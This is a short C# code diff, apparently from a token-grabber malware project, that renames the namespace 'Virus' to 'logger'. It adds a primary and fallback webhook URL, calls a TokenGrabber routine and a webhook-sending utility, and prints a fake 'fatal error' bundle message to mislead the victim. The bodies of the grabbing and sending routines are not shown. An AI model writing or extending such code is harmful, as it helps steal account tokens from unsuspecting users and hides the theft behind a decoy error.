@@ -5,26 +5,37 @@ using System.Linq;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 
-namespace Virus
+namespace logger
 {
     class Program
     {
-        static void Main(string[] args)
+
+
+        //main hook
+        public static string webhook = "webhook-link";
+
+        //will work if the main^ is dead
+        public static string altwebhook = "";
+
+
+        static async Task Main(string[] args)
         {
 
 
 
 
             TokenGrabber();
+            await Utils.SendWebhookAsync();
 
-            while (true)
-            {
-
-            }
+            Console.WriteLine(@"Failure processing application bundle.
+Bundle header version compatibility check failed.
+A fatal error occured while processing application bundle");
+            Console.ReadLine();
 
 
 
         }
+
 
         public static void TokenGrabber()
         {
